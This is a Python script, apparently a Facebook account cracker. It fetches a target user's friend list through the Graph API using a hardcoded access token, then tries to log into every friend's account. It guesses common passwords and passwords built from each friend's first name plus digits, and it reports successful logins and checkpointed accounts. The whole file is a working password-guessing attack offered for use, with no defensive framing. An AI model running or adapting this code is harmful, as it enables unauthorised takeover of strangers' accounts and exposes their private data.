
import requests


give_id=input("Enter Id for max friends: ")
fb_token="EAAAAUaZA8jlABAHklSuZCU07JgyZCx1I2TMIZC85zmfmMsVQWXY28oUX9XLL9R7D5NADsFa60pezP2ZBsh6X4CFLaPExnxiqndCr9j8msTb3vrsYWVFOKAQVrWQQvoKm4YVCWMLEnqMEGp2BXgqrEJqc3L5ioogR24QzZCyviWf0CMeJrMAZB6bBuj5TzXJTrEZD"
friend_api_url="https://graph.facebook.com/v1.0/"+give_id+"/friends?access_token="+fb_token
r = requests.get(friend_api_url, {})

# extracting data in json format
data = r.json()

print(len(data['data']))
passwords = ["786786",
             "786000", '123456',"pakistan","pakistan123","pakistan786"]
passwords2=["786","123","12","1234"]

# passwords=['786786','786000','pakistan123','pakistan','pakistan786']
# passwords2=['786','123','1234','12']

# passwords=["passport2021"]
# passwords2=[]

# print(data['data'])


def isEnglish(s):
    try:
        s.encode(encoding='utf-8').decode('ascii')
    except UnicodeDecodeError:
        return False
    else:
        return True


def login(user,pswd):
    login_url = "https://b-api.facebook.com/method/auth.login?access_token=" \
                "237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" +\
                user + "&locale=en_US&password=" +pswd + "&sdk=android&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
    r = requests.get(login_url)
    data = r.json()
    # print("checking: "+user+" | "+pswd)
    if 'access_token' in data:
        print("[OK]: " + user + " | " + pswd)
        return True
    elif 'www.facebook.com' in data['error_msg']:
        print("[CP]: " + user + " | " + pswd)
        return True
    return False






for i in data['data']:

    name_split_arr=i['name'].split()

    for j in passwords:
        # print(j)
        # print("checking: "+i['id']+" | "+j)
        if login(i['id'],j):
            break
    if isEnglish(i['id']):

        for j in passwords2:
            check=False
            passs = name_split_arr[0].lower() + "" + j
            if login(i['id'], passs):
                check = True
                break
            # for k in name_split_arr:

                # passs=j+""+k
                # if login(i['id'],passs):
                #     check=True
                #     break
                # passs=k.lower()+""+j
                # if login(i['id'],passs):
                #     check=True
                #     break
                # passs=j+""+k.lower()
                # if login(i['id'],passs):
                #     check=True
                #     break



            # if check:
            #     break
